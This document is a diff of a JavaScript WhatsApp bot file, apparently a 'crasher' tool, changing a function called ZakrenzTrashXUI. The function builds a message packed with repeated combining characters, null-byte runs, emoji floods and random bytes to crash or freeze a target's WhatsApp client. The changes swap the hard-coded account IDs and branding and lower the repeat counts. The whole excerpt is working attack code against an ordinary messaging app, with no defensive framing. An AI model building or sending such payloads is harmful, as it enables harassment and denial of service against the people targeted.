@@ -473,18 +473,18 @@ async function protocolbug3(target, mention) {
 
 async function ZakrenzTrashXUI(target) {
   const jidList = [
-    "1744254936165140@s.whatsapp.net",
-    "1744254936165140@s.whatsapp.net"
+    "120363383395@s.whatsapp.net",
+    "120363383395@s.whatsapp.net"
   ];
   const m = {
     key: {
       fromMe: false,
       remoteJid: "status@broadcast",
-      participant: "1744254936165140@s.whatsapp.net"
+      participant: "120363383395@s.whatsapp.net"
     },
     message: {
       extendedTextMessage: {
-        text: "ꦾꦽ" + "ꦾꦽ".repeat(500) // Was 9000
+        text: "ꦾꦽ" + "ꦾꦽ".repeat(500)
       }
     }
   };
@@ -496,7 +496,7 @@ async function ZakrenzTrashXUI(target) {
     console.error("Failed to retrieve HangzX.json:", error);
     apiClientData = {};
   }
-  const trashHeader = "𝐂𝐚𝐫𝐥𝐨𝐭𝐭𝐚 | 𝐓𝐫𝐚𝐬𝐡𝐔𝐈 𖣂";
+  const trashHeader = "ᴊᴀᴡᴀ ᴊᴀᴡᴀ ᴊᴀᴡᴀ | ʜᴀɴɢᴢᴄʀᴀsʜᴇʀ 𖣂";
   const mentionsText = jidList.map(jid => `@${jid.split("@")[0]}`).join(" 𖣂 ") + " 𖣂";
   const bytePayload = Buffer.from(
     Array.from({ length: 2048 }, () => Math.floor(Math.random() * 256))
@@ -518,7 +518,7 @@ async function ZakrenzTrashXUI(target) {
   const invisibleCrasher = "\u0000".repeat(300);
   const emojiFlood = "❄️".repeat(300);
   const trashBody =
-    "꧀ꦽꦾꦻꦸꦃ".repeat(300) + // Was 9000
+    "꧀ꦽꦾꦻꦸꦃ".repeat(300) +
     glitchText +
     bytePayload +
     sysIntPayload +
@@ -545,7 +545,7 @@ async function ZakrenzTrashXUI(target) {
           thumbnail: fs.readFileSync("./system/lib/bruh.png")
         },
         forwardedNewsletterMessageInfo: {
-          newsletterJid: "1744254936165140@newsletter",
+          newsletterJid: "120363383395@newsletter",
           newsletterName: "𖣂 - Hangz Real - 𖣂"
         }
       }
